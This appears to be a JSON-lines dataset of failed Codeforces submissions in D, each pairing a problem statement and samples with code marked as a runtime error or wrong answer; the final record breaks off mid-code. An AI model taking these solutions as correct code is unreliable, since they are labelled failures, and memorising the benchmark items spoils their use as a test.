{"difficulty":1300,"lang":"D","lang_cluster":"d","src_uid":"135_A","submission_id":"9814166","tags":["greedy","implementation","sortings"],"exec_outcome":"RUNTIME_ERROR","source_code":"\u00ef\u00bb\u00bfimport std.stdio;\r\nimport std.algorithm;\r\n\r\nvoid main() {\r\n\tint n;\r\n\tint[] a;\r\n\tint temp;\r\n\r\n\treadf(\" %s %s\", &n, &temp);\r\n\r\n\ta ~= temp;\r\n\tint max = temp;\r\n\r\n\tint idx = 0;\r\n\tforeach (i; 1 .. n) {\r\n\t\treadf(\" %s\", &temp);\r\n\t\ta ~= temp;\r\n\t\tif (temp > max) {\r\n\t\t\tmax = temp;\r\n\t\t\tidx = i;\r\n\t\t}\r\n\t}\r\n\r\n\t(a[idx] == 1) ? a[idx] = 2 : a[idx] = 1;\r\n\r\n\twritefln(\"%(%s %)\", sort(a));\r\n}","description":"Little Petya very much likes arrays consisting of n integers, where each of them is in the range from 1 to 10^9, inclusive. Recently he has received one such array as a gift from his mother. Petya didn't like it at once. He decided to choose exactly one element from the array and replace it with another integer that also lies in the range from 1 to 10^9, inclusive. It is not allowed to replace a number with itself or to change no number at all. After the replacement Petya sorted the array by the numbers' non-decreasing. Now he wants to know for each position: what minimum number could occupy it after the replacement and the sorting.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2264n\u226410^5), which represents how many numbers the array has. The next line contains n space-separated integers \u2014 the array's description. All elements of the array lie in the range from 1 to 10^9, inclusive.\n","output_spec":"Print n space-separated integers \u2014 the minimum possible values of each array element after one replacement and the sorting are performed.\n","notes":null,"sample_inputs":["5\n1 2 3 4 5\n","5\n2 3 4 5 6\n","3\n2 2 2\n"],"sample_outputs":["1 1 2 3 4\n","1 2 3 4 5\n","1 2 2\n"]}
{"difficulty":1000,"lang":"D","lang_cluster":"d","src_uid":"137_B","submission_id":"9203225","tags":["greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"import std.stdio;\r\nimport std.ascii;\r\nimport std.range;\r\nimport std.array;\r\nimport std.functional;\r\nimport std.algorithm;\r\nimport std.conv;\r\nimport std.container;\r\nimport std.math;\r\nimport std.numeric;\r\nimport std.string;\r\nimport std.c.string;\r\nimport std.random;\r\nimport std.regex;\r\nimport std.typecons;\r\n\r\nvoid main() {\r\n    int N; scanf(\"%d\\n\", &N);\r\n    auto u = new bool[N];\r\n    int c;\r\n    foreach (i; 0 .. N) {\r\n        int x; scanf(\"%d\", &x);\r\n        x--;\r\n        if (x >= N) c++;\r\n        if (u[x]) c++;\r\n        u[x] = true;\r\n    }\r\n    writeln(c);\r\n}\r\n","description":"\"Hey, it's homework time\" \u2014 thought Polycarpus and of course he started with his favourite subject, IT. Polycarpus managed to solve all tasks but for the last one in 20 minutes. However, as he failed to solve the last task after some considerable time, the boy asked you to help him.The sequence of n integers is called a permutation if it contains all integers from 1 to n exactly once.You are given an arbitrary sequence a1,a2,...,an containing n integers. Each integer is not less than 1 and not greater than 5000. Determine what minimum number of elements Polycarpus needs to change to get a permutation (he should not delete or add numbers). In a single change he can modify any single sequence element (i. e. replace it with another integer).","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains an integer n (1\u2264n\u22645000) which represents how many numbers are in the sequence. The second line contains a sequence of integers ai (1\u2264ai\u22645000,1\u2264i\u2264n).\n","output_spec":"Print the only number \u2014 the minimum number of changes needed to get the permutation.\n","notes":"The first sample contains the permutation, which is why no replacements are required.\nIn the second sample it is enough to replace the first element with the number 1 and that will make the sequence the needed permutation.\nIn the third sample we can replace the second element with number 4 and the fourth element with number 2.\n","sample_inputs":["3\n3 1 2\n","2\n2 2\n","5\n5 3 3 3 1\n"],"sample_outputs":["0\n","1\n","2\n"]}
{"difficulty":800,"lang":"D","lang_cluster":"d","src_uid":"1398_A","submission_id":"115646853","tags":["geometry","math"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio;\r\nimport std.conv;\r\nimport std.algorithm;\r\nimport std.array;\r\nimport std.string;\r\nimport std.uni;\r\nimport std.math;\r\nimport std.container.rbtree;\r\nimport std.range;\r\n\r\nvoid main()\r\n{\r\n    auto t = to!long(readln().chomp);\r\n    OUTER: foreach(_; 0..t)\r\n    {\r\n        auto n = readln();\r\n        auto arr = readln().chomp.splitter(\" \").map!(to!long).map!(x => pow(x, 2)).array;\r\n\r\n        for(int i = 0; i < arr.length; i++)\r\n        {\r\n            for(int j = i+1; j < arr.length; j++)\r\n            {\r\n                double target = arr[i]+arr[j];\r\n                bool found = false;\r\n                for(int z = j+1; z < arr.length; z++)\r\n                {\r\n                    if(arr[z] >= target)\r\n                    {\r\n                        writeln(format(\"%d %d %d\", i, j, z));\r\n                        continue OUTER;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        \r\n        writeln(\"-1\");\r\n    }\r\n}","description":"You are given an array $$$a_1, a_2, \\dots , a_n$$$, which is sorted in non-decreasing order ($$$a_i \\le a_{i + 1})$$$. Find three indices $$$i$$$, $$$j$$$, $$$k$$$ such that $$$1 \\le i < j < k \\le n$$$ and it is impossible to construct a non-degenerate triangle (a triangle with nonzero area) having sides equal to $$$a_i$$$, $$$a_j$$$ and $$$a_k$$$ (for example it is possible to construct a non-degenerate triangle with sides $$$3$$$, $$$4$$$ and $$$5$$$ but impossible with sides $$$3$$$, $$$4$$$ and $$$7$$$). If it is impossible to find such triple, report it.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains one integer $$$t$$$ ($$$1 \\\\le t \\\\le 1000$$$)\u00a0\u2014 the number of test cases.\nThe first line of each test case contains one integer $$$n$$$ ($$$3 \\\\le n \\\\le 5 \\\\cdot 10^4$$$)\u00a0\u2014 the length of the array $$$a$$$.\nThe second line of each test case contains $$$n$$$ integers $$$a_1, a_2, \\\\dots , a_n$$$ ($$$1 \\\\le a_i \\\\le 10^9$$$; $$$a_{i - 1} \\\\le a_i$$$)\u00a0\u2014 the array $$$a$$$.\nIt is guaranteed that the sum of $$$n$$$ over all test cases does not exceed $$$10^5$$$.\n","output_spec":"For each test case print the answer to it in one line.\nIf there is a triple of indices $$$i$$$, $$$j$$$, $$$k$$$ ($$$i < j < k$$$) such that it is impossible to construct a non-degenerate triangle having sides equal to $$$a_i$$$, $$$a_j$$$ and $$$a_k$$$, print that three indices in ascending order. If there are multiple answers, print any of them.\nOtherwise, print -1.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":800,"lang":"D","lang_cluster":"d","src_uid":"148_A","submission_id":"5487237","tags":["constructive+algorithms","implementation","math"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio;\r\nimport std.algorithm;\r\nimport std.range;\r\n\r\nvoid main()\r\n{\r\n    uint[4] nums;\r\n    uint total;\r\n    readf(\"%s\\n%s\\n%s\\n%s\\n%s\\n\", &nums[0], &nums[1], &nums[2], &nums[3], &total);\r\n    auto sequence = iota(1, total+1).map!(a => any!(b => a%b==0)(nums.dup));\r\n    sequence.save.writeln;\r\n    reduce!((a,b) => a + b)(0, sequence).writeln;\r\n}","description":"\u00abOne dragon. Two dragon. Three dragon\u00bb, \u2014 the princess was counting. She had trouble falling asleep, and she got bored of counting lambs when she was nine.However, just counting dragons was boring as well, so she entertained herself at best she could. Tonight she imagined that all dragons were here to steal her, and she was fighting them off. Every k-th dragon got punched in the face with a frying pan. Every l-th dragon got his tail shut into the balcony door. Every m-th dragon got his paws trampled with sharp heels. Finally, she threatened every n-th dragon to call her mom, and he withdrew in panic.How many imaginary dragons suffered moral or physical damage tonight, if the princess counted a total of d dragons?","input_from":"standard input","output_to":"standard output","input_spec":"Input data contains integer numbers k,l,m,n and d, each number in a separate line (1\u2264k,l,m,n\u226410, 1\u2264d\u226410^5).\n","output_spec":"Output the number of damaged dragons.\n","notes":"In the first case every first dragon got punched with a frying pan. Some of the dragons suffered from other reasons as well, but the pan alone would be enough.\nIn the second case dragons 1, 7, 11, 13, 17, 19 and 23 escaped unharmed.\n","sample_inputs":["1\n2\n3\n4\n12\n","2\n3\n4\n5\n24\n"],"sample_outputs":["12\n","17\n"]}
{"difficulty":900,"lang":"D","lang_cluster":"d","src_uid":"149_A","submission_id":"6987469","tags":["greedy","implementation","sortings"],"exec_outcome":"RUNTIME_ERROR","source_code":"import std.stdio;\r\n\r\nvoid main() {\r\n\tint[12] array;\r\n\tint n;\r\n\treadf(\" %s\", &n);\r\n\tfor (int i = 0; i < 12; i++)\r\n\t\treadf(\" %s\", &array[i]);\r\n\r\n\tarray.sort;\r\n\r\n\tint counter = 0;\r\n\tint count = 0;\t\r\n\tforeach_reverse(e; array) {\r\n\t\tif (counter >= n) {\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcounter += e;\r\n\t\tcount++;\r\n\t\t\r\n\t}\r\n\r\n\twriteln(count);\r\n}","description":"What joy! Petya's parents went on a business trip for the whole year and the playful kid is left all by himself. Petya got absolutely happy. He jumped on the bed and threw pillows all day long, until... Today Petya opened the cupboard and found a scary note there. His parents had left him with duties: he should water their favourite flower all year, each day, in the morning, in the afternoon and in the evening. \"Wait a second!\" \u2014 thought Petya. He know for a fact that if he fulfills the parents' task in the i-th (1\u2264i\u226412) month of the year, then the flower will grow by ai centimeters, and if he doesn't water the flower in the i-th month, then the flower won't grow this month. Petya also knows that try as he might, his parents won't believe that he has been watering the flower if it grows strictly less than by k centimeters. Help Petya choose the minimum number of months when he will water the flower, given that the flower should grow no less than by k centimeters.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains exactly one integer k (0\u2264k\u2264100). The next line contains twelve space-separated integers: the i-th (1\u2264i\u226412) number in the line represents ai (0\u2264ai\u2264100). \n","output_spec":"Print the only integer \u2014 the minimum number of months when Petya has to water the flower so that the flower grows no less than by k centimeters. If the flower can't grow by k centimeters in a year, print -1.\n","notes":"Let's consider the first sample test. There it is enough to water the flower during the seventh and the ninth month. Then the flower grows by exactly five centimeters.\nIn the second sample Petya's parents will believe him even if the flower doesn't grow at all (k=0). So, it is possible for Petya not to water the flower at all.\n","sample_inputs":["5\n1 1 1 1 2 2 3 2 2 1 1 1\n","0\n0 0 0 0 0 0 0 1 1 2 3 0\n","11\n1 1 4 1 1 5 1 1 4 1 1 1\n"],"sample_outputs":["2\n","0\n","3\n"]}
{"difficulty":900,"lang":"D","lang_cluster":"d","src_uid":"160_A","submission_id":"36302662","tags":["greedy","sortings"],"exec_outcome":"RUNTIME_ERROR","source_code":"import std.stdio;\r\nimport std.array;\r\nimport std.algorithm;\r\nimport std.conv;\r\n\r\nint main() {\r\n    auto s = stdin.byLine;\r\n    s.popFront();\r\n    auto arr = s.front.split(\" \").map!(i => to!int(i))();\r\n    int[] arr_sum;\r\n    arr_sum.length = arr.length;\r\n    arr_sum[0] = arr[0];\r\n    for (uint i = 1; i < arr.length; i++) {\r\n        arr_sum[i] = arr[i] + arr_sum[i - 1];\r\n    }\r\n    float max = arr_sum[arr_sum.length - 1];\r\n    int idx = 0;\r\n    for (uint i = arr_sum.length - 1; i >= 0; i--) {\r\n        if (arr_sum[i] < (max\/2)) {\r\n            idx = i;\r\n            break;\r\n        }\r\n    }\r\n    writeln(arr_sum.length - idx - 1);\r\n    return 0;\r\n}","description":"Imagine that you have a twin brother or sister. Having another person that looks exactly like you seems very unusual. It's hard to say if having something of an alter ego is good or bad. And if you do have a twin, then you very well know what it's like.Now let's imagine a typical morning in your family. You haven't woken up yet, and Mom is already going to work. She has been so hasty that she has nearly forgotten to leave the two of her darling children some money to buy lunches in the school cafeteria. She fished in the purse and found some number of coins, or to be exact, n coins of arbitrary values a1,a2,...,an. But as Mom was running out of time, she didn't split the coins for you two. So she scribbled a note asking you to split the money equally.As you woke up, you found Mom's coins and read her note. \"But why split the money equally?\" \u2014 you thought. After all, your twin is sleeping and he won't know anything. So you decided to act like that: pick for yourself some subset of coins so that the sum of values of your coins is strictly larger than the sum of values of the remaining coins that your twin will have. However, you correctly thought that if you take too many coins, the twin will suspect the deception. So, you've decided to stick to the following strategy to avoid suspicions: you take the minimum number of coins, whose sum of values is strictly more than the sum of values of the remaining coins. On this basis, determine what minimum number of coins you need to take to divide them in the described manner.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (1\u2264n\u2264100) \u2014 the number of coins. The second line contains a sequence of n integers a1, a2, ..., an (1\u2264ai\u2264100) \u2014 the coins' values. All numbers are separated with spaces.\n","output_spec":"In the single line print the single number \u2014 the minimum needed number of coins.\n","notes":"In the first sample you will have to take 2 coins (you and your twin have sums equal to 6,0 correspondingly). If you take 1 coin, you get sums 3,3. If you take 0 coins, you get sums 0,6. Those variants do not satisfy you as your sum should be strictly more that your twins' sum.\nIn the second sample one coin isn't enough for us, too. You can pick coins with values 1,2 or 2,2. In any case, the minimum number of coins equals 2. \n","sample_inputs":["2\n3 3\n","3\n2 1 2\n"],"sample_outputs":["2\n","2\n"]}
{"difficulty":1500,"lang":"D","lang_cluster":"d","src_uid":"166_E","submission_id":"7371530","tags":["dp","math","matrices"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio;\nimport std.math;\n\nvoid main(){\n  uint n;\n  readf(\"%s\\n\",&n);\n\n  solve1(n);\n  \/\/solve2(n+1);\n}\n\nvoid solve2(uint size){\n  uint mod = 1000000007;\n  uint[] m = new uint[size];\n\n  m[0] = 0;\n  m[1] = 0;\n  m[2] = 3;\n  m[3] = 6;\n  for(uint i = 4; i < m.length; i++){\n    auto sum = 0;\n    \/\/writefln(\"<%s>\",i);\n    for(uint n = 0; n < i-2; n++){\n      sum += pow(2,n)*m[i-n-2];\n      \/\/writefln(\"%s,%s = %s\",n,i-n-2,pow(2,n)*m[i-n-2]);\n    }\n    m[i] = (3*(sum + pow(2,i-2))) % mod;\n  }\n\n  writeln(m[size-1]);\n}\n\nvoid solve1(uint n){\n  uint k = n;\n  if(n < 10){\n    n = 10;\n  }\n\n  uint mod = 1000000007;\n  \/\/uint size = 1000000;\n  \/\/uint size = 10;\n  uint[] m = new uint[n+1];\n\n  m[0] = 0;\n  m[1] = 0;\n  m[2] = 3;\n  m[3] = 6;\n  for(uint i = 4; i < m.length; i++){\n    auto x1 = m[i-1] % mod;\n    auto x2 = m[i-2] % mod;\n    m[i] = (2*x1+3*x2) % mod;\n  }\n\n  writeln(m[k]);\n}\n","description":"You are given a tetrahedron. Let's mark its vertices with letters A, B, C and D correspondingly. An ant is standing in the vertex D of the tetrahedron. The ant is quite active and he wouldn't stay idle. At each moment of time he makes a step from one vertex to another one along some edge of the tetrahedron. The ant just can't stand on one place.You do not have to do much to solve the problem: your task is to count the number of ways in which the ant can go from the initial vertex D to itself in exactly n steps. In other words, you are asked to find out the number of different cyclic paths with the length of n from vertex D to itself. As the number can be quite large, you should print it modulo 1000000007 (10^9+7). ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only integer n (1\u2264n\u226410^7) \u2014 the required length of the cyclic path.\n","output_spec":"Print the only integer \u2014 the required number of ways modulo 1000000007 (10^9+7).\n","notes":"The required paths in the first sample are: \n  D-A-D  D-B-D  D-C-D ","sample_inputs":["2\n","4\n"],"sample_outputs":["3\n","21\n"]}
{"difficulty":800,"lang":"D","lang_cluster":"d","src_uid":"169_A","submission_id":"89342392","tags":["sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"module _template;\r\nimport std.stdio;\r\nimport std.algorithm;\r\nimport std.container;\r\nimport std.range;\r\nimport std.numeric;\r\nimport std.conv;\r\nimport std.typecons;\r\nimport std.format;\r\n\r\nstruct IO {\r\n        string read_string() {\r\n                while (tokens.empty) {\r\n                tokens = readln.split;\r\n        }\r\n        auto token = tokens.front;\r\n                tokens.popFront;\r\n                return token;\r\n        }\r\n        \r\n        int read_int() {\r\n                return read_string.to!int;\r\n        }\r\n        \r\n        string[] tokens;\r\n}\r\n\r\nvoid main() {\r\n        IO cin;\r\n        int t = 1;\r\n        \/\/ int t = cin.read_int;\r\n        while (t--) {\r\n                int n = cin.read_int;\r\n                int a = cin.read_int;\r\n                int b = cin.read_int;\r\n\r\n                int[] v = new int[n];\r\n                for (int i = 0; i < n; i++) {\r\n                        v[i] = cin.read_int;\r\n                }\r\n                sort(v);\r\n                writeln(v[b] - v[a]);\r\n        }        \r\n}","description":"Petya and Vasya are brothers. Today is a special day for them as their parents left them home alone and commissioned them to do n chores. Each chore is characterized by a single parameter \u2014 its complexity. The complexity of the i-th chore equals hi.As Petya is older, he wants to take the chores with complexity larger than some value x (hi>x) to leave to Vasya the chores with complexity less than or equal to x (hi\u2264x). The brothers have already decided that Petya will do exactly a chores and Vasya will do exactly b chores (a+b=n).In how many ways can they choose an integer x so that Petya got exactly a chores and Vasya got exactly b chores?","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains three integers n,a and b (2\u2264n\u22642000; a,b\u22651; a+b=n) \u2014 the total number of chores, the number of Petya's chores and the number of Vasya's chores.\nThe next line contains a sequence of integers h1,h2,...,hn (1\u2264hi\u226410^9), hi is the complexity of the i-th chore. The numbers in the given sequence are not necessarily different.\nAll numbers on the lines are separated by single spaces.\n","output_spec":"Print the required number of ways to choose an integer value of x. If there are no such ways, print 0.\n","notes":"In the first sample the possible values of x are 3, 4 or 5.\nIn the second sample it is impossible to find such x, that Petya got 3 chores and Vasya got 4.\n","sample_inputs":["5 2 3\n6 2 3 100 1\n","7 3 4\n1 1 9 1 1 1 1\n"],"sample_outputs":["3\n","0\n"]}
{"difficulty":1300,"lang":"D","lang_cluster":"d","src_uid":"189_A","submission_id":"16039877","tags":["brute+force","dp"],"exec_outcome":"RUNTIME_ERROR","source_code":"import std.stdio, std.algorithm, std.string, std.conv, std.range;\n\nvoid main() {\n    int n, a, b, c;\n    readf(\"%d %d %d %d\\n\", &n, &a, &b, &c);\n    dp(n, a, b, c).writeln;\n}\n\nint dp(int n, int a, int b, int c) {\n    int[] r = new int[n + 1];\n    foreach (e; [ a, b, c ]) {\n        r[e] = 1;\n    }\n\n    foreach (int i, ref e; r) {\n        if (e > 0) {\n            foreach (cut; [ a, b, c ]) {\n                if (i + cut <= n) {\n                    r[i + cut] = max(r[i] + 1, r[i + cut]);\n                }\n            }\n        }\n    }\n\n    return r[n];\n}\n","description":"Polycarpus has a ribbon, its length is n. He wants to cut the ribbon in a way that fulfils the following two conditions:   After the cutting each ribbon piece should have length a, b or c.  After the cutting the number of ribbon pieces should be maximum. Help Polycarpus and find the number of ribbon pieces after the required cutting.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains four space-separated integers n, a, b and c (1\u2264n,a,b,c\u22644000) \u2014 the length of the original ribbon and the acceptable lengths of the ribbon pieces after the cutting, correspondingly. The numbers a, b and c can coincide.\n","output_spec":"Print a single number \u2014 the maximum possible number of ribbon pieces. It is guaranteed that at least one correct ribbon cutting exists.\n","notes":"In the first example Polycarpus can cut the ribbon in such way: the first piece has length 2, the second piece has length 3.\nIn the second example Polycarpus can cut the ribbon in such way: the first piece has length 5, the second piece has length 2.\n","sample_inputs":["5 5 3 2\n","7 5 5 2\n"],"sample_outputs":["2\n","2\n"]}
{"difficulty":1300,"lang":"D","lang_cluster":"d","src_uid":"192_A","submission_id":"22232762","tags":["binary+search","brute+force","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio;\r\nimport std.string;\r\nimport std.conv;\r\n\r\n\r\nint main() {\r\n    debug stdin = File(\"in.txt\", \"r\");\r\n\r\n    int[44722] tri = void;\r\n    foreach (i; 0 .. 44722) {\r\n        tri[i] = i * (i + 1) \/ 2;\r\n    }\r\n\r\n    int n;\r\n    readf(\" %s\\n\", &n);\r\n\r\n    foreach (i; 0 .. 44722) {\r\n        int a = tri[i];\r\n        foreach (j; i .. 44722) {\r\n            int b = tri[j];\r\n            if (a + b >= n) {\r\n                if (a + b > n) break;\r\n                else {\r\n                    writeln(\"YES\");\r\n                    return 0;\r\n                }\r\n            }\r\n        }\r\n    }\r\n    writeln(\"NO\");\r\n\r\n    return 0;\r\n}\r\n","description":"As you very well know, this year's funkiest numbers are so called triangular numbers (that is, integers that are representable as , where k is some positive integer), and the coolest numbers are those that are representable as a sum of two triangular numbers.A well-known hipster Andrew adores everything funky and cool but unfortunately, he isn't good at maths. Given number n, help him define whether this number can be represented by a sum of two triangular numbers (not necessarily different)!","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains an integer n (1\u2264n\u226410^9).\n","output_spec":"Print \"YES\" (without the quotes), if n can be represented as a sum of two triangular numbers, otherwise print \"NO\" (without the quotes).\n","notes":"In the first sample number .\nIn the second sample number 512 can not be represented as a sum of two triangular numbers.\n","sample_inputs":["256\n","512\n"],"sample_outputs":["YES\n","NO\n"]}
{"difficulty":1000,"lang":"D","lang_cluster":"d","src_uid":"1_A","submission_id":"211921273","tags":["math"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio;\r\n\r\nvoid main() {\r\n    int n, m, a;\r\n    readf(\"%s %s %s\\n\", n, m, a);\r\n    writeln(((n + a - 1) \/ a) * ((m + a - 1) \/ a));\r\n}","description":"Theatre Square in the capital city of Berland has a rectangular shape with the size n\u00d7m meters. On the occasion of the city's anniversary, a decision was taken to pave the Square with square granite flagstones. Each flagstone is of the size a\u00d7a.What is the least number of flagstones needed to pave the Square? It's allowed to cover the surface larger than the Theatre Square, but the Square has to be covered. It's not allowed to break the flagstones. The sides of flagstones should be parallel to the sides of the Square.","input_from":"standard input","output_to":"standard output","input_spec":"The input contains three positive integer numbers in the first line: n,m and a (1\u2264n,m,a\u226410^9).\n","output_spec":"Write the needed number of flagstones.\n","notes":null,"sample_inputs":["6 6 4\n"],"sample_outputs":["4\n"]}
{"difficulty":1200,"lang":"D","lang_cluster":"d","src_uid":"203_A","submission_id":"3697765","tags":["brute+force","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"module cf_203A;\r\n\r\nimport std.stdio;\r\n\r\nvoid main() {\r\n    int x, t, a, b, da, db;\r\n\r\n    readf(\"%d %d %d %d %d %d\", &x, &t, &a, &b, &da, &db);\r\n\r\n    bool valeraSaidTrue = false;\r\n    int aa = a;\r\n\r\n    dualFor:\r\n    for (int i = 0; i < t; ++i) {\r\n        int bb = b;\r\n\r\n        for (int j = 0; j < t; ++j) {\r\n            if (aa + bb == x) {\r\n                valeraSaidTrue = true;\r\n                break dualFor;\r\n            }\r\n            bb -= db;\r\n        }\r\n        aa -= da;\r\n    }\r\n\r\n    if (x == a || x == b || x == 0) {\r\n        valeraSaidTrue = true;\r\n    }\r\n\r\n    writeln(valeraSaidTrue? \"YES\": \"NO\");\r\n}","description":"A boy Valera registered on site Codeforces as Valera, and wrote his first Codeforces Round #300. He boasted to a friend Arkady about winning as much as x points for his first contest. But Arkady did not believe his friend's words and decided to check whether Valera could have shown such a result.He knows that the contest number 300 was unusual because there were only two problems. The contest lasted for t minutes, the minutes are numbered starting from zero. The first problem had the initial cost of a points, and every minute its cost reduced by da points. The second problem had the initial cost of b points, and every minute this cost reduced by db points. Thus, as soon as the zero minute of the contest is over, the first problem will cost a-da points, and the second problem will cost b-db points. It is guaranteed that at any moment of the contest each problem has a non-negative cost.Arkady asks you to find out whether Valera could have got exactly x points for this contest. You should assume that Valera could have solved any number of the offered problems. You should also assume that for each problem Valera made no more than one attempt, besides, he could have submitted both problems at the same minute of the contest, starting with minute 0 and ending with minute number t-1. Please note that Valera can't submit a solution exactly t minutes after the start of the contest or later.","input_from":"standard input","output_to":"standard output","input_spec":"The single line of the input contains six integers x,t,a,b,da,db (0\u2264x\u2264600;\u00a01\u2264t,a,b,da,db\u2264300) \u2014 Valera's result, the contest's duration, the initial cost of the first problem, the initial cost of the second problem, the number of points that the first and the second problem lose per minute, correspondingly.\nIt is guaranteed that at each minute of the contest each problem has a non-negative cost, that is, a-i\u00b7da\u22650 and b-i\u00b7db\u22650 for all 0\u2264i\u2264t-1.\n","output_spec":"If Valera could have earned exactly x points at a contest, print \"YES\", otherwise print \"NO\" (without the quotes).\n","notes":"In the first sample Valera could have acted like this: he could have submitted the first problem at minute 0 and the second problem \u2014 at minute 2. Then the first problem brings him 20 points and the second problem brings him 10 points, that in total gives the required 30 points.\n","sample_inputs":["30 5 20 20 3 5\n","10 4 100 5 5 1\n"],"sample_outputs":["YES\n","NO\n"]}
{"difficulty":1200,"lang":"D","lang_cluster":"d","src_uid":"217_A","submission_id":"5075958","tags":["brute+force","dfs+and+similar","dsu","graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio;\r\nimport std.conv;\r\nimport std.string;\r\nimport std.typecons;\r\nimport std.algorithm;\r\nimport std.array;\r\nimport std.range;\r\nimport std.math;\r\n\r\nvoid main()\r\n{\r\n  auto n = readln().chomp().to!int();\r\n  auto p = new int[][](n, 2);\r\n  auto f = new bool[n];\r\n\r\n  foreach (i; iota(n)) {\r\n    p[i] = readln().split().map!(to!int)().array();\r\n  }\r\n\r\n  foreach (i; iota(n)) {\r\n    foreach (j; iota(n)) {\r\n      if (i == j) continue;\r\n      if (p[i][0] == p[j][0] || p[i][1] == p[j][1]) {\r\n        f[j] = 1;\r\n      }\r\n    }\r\n  }\r\n\r\n  int cnt;\r\n  foreach (i; iota(n)) {\r\n    if (!f[i]) cnt++;\r\n  }\r\n\r\n  writeln(cnt ? cnt - 1 : 0);\r\n}","description":"Bajtek is learning to skate on ice. He's a beginner, so his only mode of transportation is pushing off from a snow drift to the north, east, south or west and sliding until he lands in another snow drift. He has noticed that in this way it's impossible to get from some snow drifts to some other by any sequence of moves. He now wants to heap up some additional snow drifts, so that he can get from any snow drift to any other one. He asked you to find the minimal number of snow drifts that need to be created.We assume that Bajtek can only heap up snow drifts at integer coordinates.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of input contains a single integer n (1\u2264n\u2264100) \u2014 the number of snow drifts. Each of the following n lines contains two integers xi and yi (1\u2264xi,yi\u22641000) \u2014 the coordinates of the i-th snow drift.\nNote that the north direction coin\u0441ides with the direction of Oy axis, so the east direction coin\u0441ides with the direction of the Ox axis. All snow drift's locations are distinct.\n","output_spec":"Output the minimal number of snow drifts that need to be created in order for Bajtek to be able to reach any snow drift from any other one.\n","notes":null,"sample_inputs":["2\n2 1\n1 2\n","2\n2 1\n4 1\n"],"sample_outputs":["1\n","0\n"]}
{"difficulty":1400,"lang":"D","lang_cluster":"d","src_uid":"233_B","submission_id":"5486911","tags":["binary+search","brute+force","math"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio;\nimport std.math;\nimport std.algorithm;\n\nvoid main() {\n\tlong N, ans =1000000000+42;\n\treadf(\" %d\",&N);\n\tfor(int i =0; i < 100; i++) {\n\t\treal D =sqrt(1.0*i*i+4.0*N);\n\t\tif(fabs(D*D-i*i-4*N) > 1e-9) continue;\n\t\tlong x =cast(long)(round(D));\n\t\tif((x-i)%2 != 0) continue;\n\t\tx =(x-i)\/2;\n\t\t\n\t\tint s =0; long y =x;\n\t\twhile(y > 0) {\n\t\t\ts +=y%10;\n\t\t\ty \/=10;}\n\t\t\n\t\tif(s == i) ans =min(ans,x);}\n\t\n\tif(ans > 1000000000) writeln(-1);\n\telse writeln(ans);}\n  \t  \t \t  \t  \t \t\t \t  \t\t\t \t","description":"Let's consider equation:x^2+s(x)\u00b7x-n=0, where x,n are positive integers, s(x) is the function, equal to the sum of digits of number x in the decimal number system.You are given an integer n, find the smallest positive integer root of equation x, or else determine that there are no such roots.","input_from":"standard input","output_to":"standard output","input_spec":"A single line contains integer n (1\u2264n\u226410^18) \u2014 the equation parameter.\nPlease, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use cin, cout streams or the %I64d specifier. \n","output_spec":"Print -1, if the equation doesn't have integer positive roots. Otherwise print such smallest integer x (x>0), that the equation given in the statement holds.\n","notes":"In the first test case x=1 is the minimum root. As s(1)=1 and 1^2+1\u00b71-2=0.\nIn the second test case x=10 is the minimum root. As s(10)=1+0=1 and 10^2+1\u00b710-110=0.\nIn the third test case the equation has no roots.\n","sample_inputs":["2\n","110\n","4\n"],"sample_outputs":["1\n","10\n","-1\n"]}
{"difficulty":1500,"lang":"D","lang_cluster":"d","src_uid":"24_B","submission_id":"51881310","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.string;\nimport std.stdio;\nimport std.conv;\nimport std.algorithm;\nimport std.typecons;\nimport std.range;\nimport std.array;\n\nvoid main()\n{\n    int[][string] positions;\n    int [string] points;\n    auto n  = readln.chomp.to!int;\n    foreach(i; 0..n )\n    {\n        auto m = readln.chomp.to!int;\n        foreach(j; 0..m )\n        {\n            auto s = readln.chomp; \n            if (! (s in positions)) \n                positions[s] = repeat(0).take(50).array;\n            positions[s] = positions[s].zip(repeat(0).take(j).array ~ [1] ~ repeat(0).take(50-j-1).array).map!\"a[0]+a[1]\".array;\n            points[s] += ([25, 18, 15, 12, 10, 8, 6, 4, 2, 1] ~ repeat(0).take(40).array)[j];\n        }\n    }\n\n    Tuple!(string, int,int[])[] arr;\n    foreach(k,v; points) \n        arr~=tuple(k,v,positions[k]);\n    \/\/writeln(arr);\n    arr.multiSort!(\"a[1]>b[1]\", \n        \"a[2][0] > b[2][0] \", \" a[2][1] > b[2][1] \", \" a[2][2] > b[2][2] \", \n        \"a[2][3] > b[2][3] \", \" a[2][4] > b[2][4] \", \" a[2][5] > b[2][5] \", \n        \"a[2][6] > b[2][6] \", \" a[2][7] > b[2][7] \", \" a[2][8] > b[2][8] \", \n        \"a[2][9] > b[2][9] \", \" a[2][10] > b[2][10] \", \" a[2][11] > b[2][11] \", \n        \"a[2][12] > b[2][12] \", \" a[2][13] > b[2][13] \", \" a[2][14] > b[2][14] \", \n        \"a[2][15] > b[2][15] \", \" a[2][16] > b[2][16] \", \" a[2][17] > b[2][17] \", \n        \"a[2][18] > b[2][18] \", \" a[2][19] > 